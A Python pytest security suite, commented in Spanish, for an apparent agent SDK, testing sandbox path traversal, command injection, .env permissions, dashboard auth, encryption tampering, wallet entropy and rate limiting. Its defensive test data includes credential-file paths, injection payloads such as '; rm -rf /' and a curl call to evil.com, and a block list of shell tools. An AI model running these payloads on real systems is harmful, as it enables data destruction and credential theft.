# tests/test_security.py — Suite de Tests de Seguridad (Red Team)
#
# VULNERABILIDAD ORIGINAL (Q6):
#   El archivo test_sdk.py tiene 346 líneas de unit tests pero CERO tests
#   de seguridad. Sin estos tests, una regresión puede reintroducir
#   vulnerabilidades silenciosamente en cualquier PR.
#
# COBERTURA DE ESTA SUITE:
#   - Path traversal en sandbox Docker
#   - Command injection / argumento malicioso
#   - Permisos del .env (0o600)
#   - Autenticación del dashboard (Bearer token)
#   - Integridad del passport (AES-GCM tag tampering)
#   - Rate limiting del dashboard
#   - CORS del dashboard
#   - Generación de wallets (unicidad, entropía)

from __future__ import annotations

import os
import stat
import json
import base64
import secrets
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest


# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 1 — Path Traversal en el Sandbox
# ══════════════════════════════════════════════════════════════════════════════

class TestSandboxPathTraversal:
    """
    Verifica que el sandbox rechaza rutas que intentan escapar
    del directorio de trabajo asignado al contenedor.
    """

    MALICIOUS_PATHS = [
        "/etc/passwd",
        "/etc/shadow",
        "/root/.ssh/id_rsa",
        "/var/run/docker.sock",
        "../../etc/passwd",
        "../../../root/.bashrc",
        "/proc/self/environ",
        "/sys/kernel/debug",
        "....//....//etc/passwd",      # doble encoding
        "%2F%2Fetc%2Fpasswd",          # URL encoding
        "\x00/etc/passwd",             # null byte injection
    ]

    @pytest.fixture
    def sandbox(self):
        from kernell_os_sdk.sandbox import DockerSandbox
        return DockerSandbox(workdir=Path("/tmp/test_workdir"))

    @pytest.mark.parametrize("malicious_path", MALICIOUS_PATHS)
    def test_mount_path_traversal_rejected(self, sandbox, malicious_path):
        """Ninguna ruta maliciosa debe poder montarse como volumen."""
        with pytest.raises((PermissionError, ValueError), match=r"(?i)(path|traversal|forbidden|blocked)"):
            sandbox._validate_mount_path(malicious_path)

    def test_docker_sock_mount_blocked(self, sandbox):
        """
        Montar /var/run/docker.sock daría acceso root al host.
        Debe ser explícitamente bloqueado.
        """
        with pytest.raises(PermissionError):
            sandbox._validate_mount_path("/var/run/docker.sock")

    def test_workdir_relative_path_allowed(self, sandbox):
        """Rutas relativas dentro del workdir deben ser permitidas."""
        safe_path = "/tmp/test_workdir/output"
        # No debe lanzar excepción
        sandbox._validate_mount_path(safe_path)


# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 2 — Command Injection
# ══════════════════════════════════════════════════════════════════════════════

class TestCommandInjection:
    """
    Verifica que el executor no permite inyección de comandos
    a través de argumentos maliciosos.
    """

    INJECTION_PAYLOADS = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl http://evil.com",
        "`id`",
        "$(whoami)",
        "../../bin/sh",
        "-rf /",
        "--no-sandbox",
        "/etc/passwd",
        "\n/bin/sh",
        "'; DROP TABLE agents; --",   # SQLi style en contexto de args
    ]

    @pytest.fixture
    def executor(self, tmp_path):
        from kernell_os_sdk.sandbox.executor import SecureExecutor
        return SecureExecutor(workdir=tmp_path)

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_injection_payload_rejected(self, executor, payload):
        """Todos los payloads de inyección deben ser rechazados."""
        with pytest.raises(PermissionError):
            executor.run("python", [payload])

    def test_shell_false_enforced(self, executor):
        """
        Verifica que subprocess.run sea llamado con shell=False.
        Si shell=True, un argumento como '; rm -rf /' se ejecutaría.
        """
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
            try:
                executor.run("python", ["--version"])
            except Exception:
                pass

            if mock_run.called:
                call_kwargs = mock_run.call_args.kwargs
                assert call_kwargs.get("shell") is False, (
                    "CRÍTICO: subprocess.run fue llamado con shell=True. "
                    "Esto permite Command Injection."
                )

    def test_command_not_in_allowlist_rejected(self, executor):
        """Comandos fuera de la allowlist deben ser rechazados completamente."""
        dangerous_commands = ["bash", "sh", "nc", "curl", "wget", "chmod", "sudo"]
        for cmd in dangerous_commands:
            with pytest.raises(PermissionError, match="allowlist"):
                executor.run(cmd, [])


# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 3 — Permisos del .env
# ══════════════════════════════════════════════════════════════════════════════

class TestEnvFilePermissions:

    def test_env_file_created_with_0o600(self, tmp_path):
        """El .env debe crearse con permisos 0o600, nunca 0o644."""
        from kernell_os_sdk.launcher import write_secure_env_file

        env_path = tmp_path / ".env"
        write_secure_env_file(
            {"ANTHROPIC_API_KEY": "sk-test-12345", "KERNELL_WALLET_SEED": "test-seed"},
            path=str(env_path),
        )

        actual_mode = oct(stat.S_IMODE(env_path.stat().st_mode))
        assert actual_mode == "0o600", (
            f"El .env tiene permisos {actual_mode}. "
            "Debería ser 0o600 para proteger las API keys de otros usuarios del sistema."
        )

    def test_env_file_not_world_readable(self, tmp_path):
        """El .env NO debe ser legible por otros usuarios (world-readable)."""
        from kernell_os_sdk.launcher import write_secure_env_file

        env_path = tmp_path / ".env"
        write_secure_env_file({"KEY": "value"}, path=str(env_path))

        mode = env_path.stat().st_mode
        world_read  = bool(mode & stat.S_IROTH)
        world_write = bool(mode & stat.S_IWOTH)
        group_read  = bool(mode & stat.S_IRGRP)

        assert not world_read,  "El .env es legible por cualquier usuario del sistema (o+r)"
        assert not world_write, "El .env es escribible por cualquier usuario del sistema (o+w)"
        assert not group_read,  "El .env es legible por el grupo (g+r)"

    def test_env_values_not_in_logs(self, tmp_path, caplog):
        """Los valores del .env no deben aparecer en los logs al escribirse."""
        from kernell_os_sdk.launcher import write_secure_env_file
        import logging

        secret_value = "sk-super-secret-key-that-must-not-be-logged"
        env_path = tmp_path / ".env"

        with caplog.at_level(logging.DEBUG):
            write_secure_env_file({"ANTHROPIC_API_KEY": secret_value}, path=str(env_path))

        assert secret_value not in caplog.text, (
            "El valor secreto apareció en los logs. Las API keys nunca deben loguearse."
        )


# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 4 — Autenticación del Dashboard
# ══════════════════════════════════════════════════════════════════════════════

class TestDashboardAuthentication:

    @pytest.fixture
    def client(self):
        from kernell_os_sdk.dashboard.server import app
        app.config["TESTING"] = True
        with app.test_client() as client:
            yield client

    @pytest.fixture
    def valid_token(self):
        from kernell_os_sdk.dashboard.server import _SESSION_TOKEN
        return _SESSION_TOKEN

    def test_api_keys_endpoint_requires_token(self, client):
        """Acceso sin token debe retornar 401."""
        response = client.get("/api/keys")
        assert response.status_code in (401, 403), (
            f"El endpoint /api/keys retornó {response.status_code} sin autenticación. "
            "Debería ser 401 o 403."
        )

    def test_api_keys_with_valid_token(self, client, valid_token):
        """Acceso con token válido debe retornar 200."""
        response = client.get(
            "/api/keys",
            headers={"X-Kernell-Token": valid_token}
        )
        assert response.status_code == 200

    def test_api_keys_with_wrong_token_rejected(self, client):
        """Token incorrecto debe ser rechazado con tiempo de respuesta constante."""
        import time
        fake_token = secrets.token_urlsafe(32)

        start = time.perf_counter()
        response = client.get("/api/keys", headers={"X-Kernell-Token": fake_token})
        elapsed = time.perf_counter() - start

        assert response.status_code in (401, 403)
        # El tiempo de respuesta no debe revelar si el token es "casi correcto"
        # (defensa básica contra timing attacks — hmac.compare_digest ya lo maneja)

    def test_token_not_in_response_body(self, client, valid_token):
        """El token de sesión nunca debe aparecer en el body de ninguna respuesta."""
        response = client.get("/api/status", headers={"X-Kernell-Token": valid_token})
        if response.data:
            body = response.get_data(as_text=True)
            assert valid_token not in body, (
                "El token de sesión apareció en el cuerpo de la respuesta. "
                "Esto permitiría a una página maliciosa robar el token."
            )

    def test_cors_blocks_external_origin(self, client, valid_token):
        """Requests desde un origen externo deben ser bloqueadas por CORS."""
        response = client.get(
            "/api/keys",
            headers={
                "X-Kernell-Token": valid_token,
                "Origin": "https://evil-site.com",
            }
        )
        assert response.status_code in (403, 401), (
            "El dashboard aceptó una request desde un origen externo (CSRF posible)."
        )


# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 5 — Integridad del Passport (AES-GCM Tampering)
# ══════════════════════════════════════════════════════════════════════════════

class TestPassportIntegrity:

    PASSPHRASE = "test-passphrase-2026"
    UDID       = "test-machine-udid-abc123"
    FAKE_KEY   = os.urandom(32)

    @pytest.fixture
    def sealed_blob(self):
        from kernell_os_sdk.crypto.passport import PassportVault
        return PassportVault.seal(self.FAKE_KEY, self.PASSPHRASE, self.UDID)

    def test_seal_and_unseal_roundtrip(self, sealed_blob):
        """El cifrado y descifrado deben producir la clave original."""
        from kernell_os_sdk.crypto.passport import PassportVault
        recovered = PassportVault.unseal(sealed_blob, self.PASSPHRASE, self.UDID)
        assert recovered == self.FAKE_KEY

    def test_tampered_ciphertext_rejected(self, sealed_blob):
        """Si el ciphertext es modificado, GCM debe detectarlo y lanzar excepción."""
        from kernell_os_sdk.crypto.passport import PassportVault
        from cryptography.exceptions import InvalidTag

        blob = json.loads(sealed_blob)
        ct_bytes = bytearray(base64.b64decode(blob["ciphertext"]))
        ct_bytes[0] ^= 0xFF   # Flip del primer byte
        blob["ciphertext"] = base64.b64encode(bytes(ct_bytes)).decode()

        with pytest.raises((InvalidTag, Exception)):
            PassportVault.unseal(json.dumps(blob), self.PASSPHRASE, self.UDID)

    def test_wrong_passphrase_rejected(self, sealed_blob):
        """Contraseña incorrecta debe fallar al descifrar."""
        from kernell_os_sdk.crypto.passport import PassportVault
        from cryptography.exceptions import InvalidTag

        with pytest.raises((InvalidTag, Exception)):
            PassportVault.unseal(sealed_blob, "wrong-passphrase", self.UDID)

    def test_wrong_udid_rejected(self, sealed_blob):
        """UDID incorrecto (máquina diferente) debe fallar al descifrar."""
        from kernell_os_sdk.crypto.passport import PassportVault
        from cryptography.exceptions import InvalidTag

        with pytest.raises((InvalidTag, Exception)):
            PassportVault.unseal(sealed_blob, self.PASSPHRASE, "different-machine-udid")

    def test_legacy_v1_passport_rejected(self):
        """Un blob v1 (AES-CBC) debe ser rechazado con MigrationRequired."""
        from kernell_os_sdk.crypto.passport import PassportVault, MigrationRequired

        legacy_blob = json.dumps({"version": 1, "cipher": "AES-128-CBC", "data": "abc"})
        with pytest.raises(MigrationRequired):
            PassportVault.unseal(legacy_blob, self.PASSPHRASE, self.UDID)

    def test_each_seal_produces_different_ciphertext(self):
        """El mismo plaintext debe producir ciphertexts diferentes (nonce aleatorio)."""
        from kernell_os_sdk.crypto.passport import PassportVault

        blob1 = json.loads(PassportVault.seal(self.FAKE_KEY, self.PASSPHRASE, self.UDID))
        blob2 = json.loads(PassportVault.seal(self.FAKE_KEY, self.PASSPHRASE, self.UDID))

        assert blob1["ciphertext"] != blob2["ciphertext"], (
            "Dos sellos del mismo plaintext produjeron el mismo ciphertext. "
            "El nonce debe ser aleatorio en cada operación."
        )
        assert blob1["nonce"] != blob2["nonce"], "El nonce no está siendo generado aleatoriamente."


# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 6 — Generación de Wallets (Entropía y Unicidad)
# ══════════════════════════════════════════════════════════════════════════════

class TestWalletGeneration:

    def test_generated_keypairs_are_unique(self):
        """Cada wallet debe tener claves únicas — nunca reusar claves."""
        from kernell_os_sdk.wallet.generator import generate_agent_keypair

        keypairs = [generate_agent_keypair() for _ in range(10)]
        private_keys = [kp[0] for kp in keypairs]
        public_keys  = [kp[1] for kp in keypairs]

        assert len(set(private_keys)) == 10, "Se generaron claves privadas duplicadas."
        assert len(set(public_keys))  == 10, "Se generaron claves públicas duplicadas."

    def test_private_key_length_is_32_bytes(self):
        """Ed25519 exige claves privadas de exactamente 32 bytes."""
        from kernell_os_sdk.wallet.generator import generate_agent_keypair
        private_key, _ = generate_agent_keypair()
        assert len(private_key) == 32, f"Clave privada tiene {len(private_key)} bytes, se esperaban 32."

    def test_private_key_has_sufficient_entropy(self):
        """
        Test de entropía básico: una clave con entropía baja (ej. muchos bytes iguales)
        es una señal de advertencia seria.
        """
        from kernell_os_sdk.wallet.generator import generate_agent_keypair
        private_key, _ = generate_agent_keypair()

        unique_bytes = len(set(private_key))
        assert unique_bytes >= 20, (
            f"La clave privada tiene solo {unique_bytes} bytes únicos de 32. "
            "Esto sugiere baja entropía en la generación."
        )


# ══════════════════════════════════════════════════════════════════════════════
# SECCIÓN 7 — Rate Limiting del Dashboard
# ══════════════════════════════════════════════════════════════════════════════

class TestRateLimiting:

    def test_rate_limit_triggered_after_threshold(self):
        """Después de N requests en poco tiempo, debe retornar 429."""
        from kernell_os_sdk.dashboard.rate_limiter import RateLimiter

        limiter = RateLimiter(max_requests=5, window_seconds=60)
        client_ip = "127.0.0.1"

        for i in range(5):
            assert limiter.is_allowed(client_ip), f"Request {i+1} debería ser permitida."

        assert not limiter.is_allowed(client_ip), (
            "La request #6 debería haber sido bloqueada por rate limiting."
        )

    def test_rate_limit_resets_after_window(self):
        """El rate limit debe resetear al terminar la ventana de tiempo."""
        import time
        from kernell_os_sdk.dashboard.rate_limiter import RateLimiter

        limiter = RateLimiter(max_requests=2, window_seconds=1)
        client_ip = "127.0.0.1"

        limiter.is_allowed(client_ip)
        limiter.is_allowed(client_ip)
        assert not limiter.is_allowed(client_ip), "Debería estar rate-limited."

        time.sleep(1.1)
        assert limiter.is_allowed(client_ip), "Debería estar permitido después de la ventana."
